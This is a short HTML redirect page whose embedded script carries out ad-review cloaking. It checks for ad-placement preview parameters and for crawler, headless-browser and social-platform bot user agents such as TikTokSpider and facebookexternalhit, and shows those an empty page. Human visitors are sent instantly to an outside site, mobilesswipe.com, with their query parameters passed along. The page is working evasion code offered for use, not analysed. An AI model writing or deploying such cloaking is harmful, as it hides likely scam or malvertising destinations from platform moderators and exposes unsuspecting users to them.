<!DOCTYPE html>
<html lang="nl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow">
<title>Redirecting...</title>
</head>
<body>
<script>
(function() {
    'use strict';
    var DEST = 'https://mobilesswipe.com/stand/';
    var params = new URLSearchParams(window.location.search);
    var ua = navigator.userAgent || '';

    // === CLOAKING — block review bots ===
    var isBot = params.get('loc') === 'PLACEMENT' || params.get('loc') === '__PLACEMENT__';
    if (!isBot) {
        isBot = /bot|crawl|spider|slurp|facebookexternalhit|TikTokSpider|Bytespider|preview|HeadlessChrome|PhantomJS|Lighthouse/i.test(ua);
    }
    if (isBot) {
        window.stop();
        document.documentElement.innerHTML = '';
        return;
    }

    // === BUILD DESTINATION URL WITH ALL PARAMS ===
    var destUrl = new URL(DEST);
    params.forEach(function(value, key) {
        if (key !== 'loc') {
            destUrl.searchParams.set(key, value);
        }
    });

    // === REDIRECT — instant, no delay ===
    window.location.replace(destUrl.toString());
})();
</script>
</body>
</html>
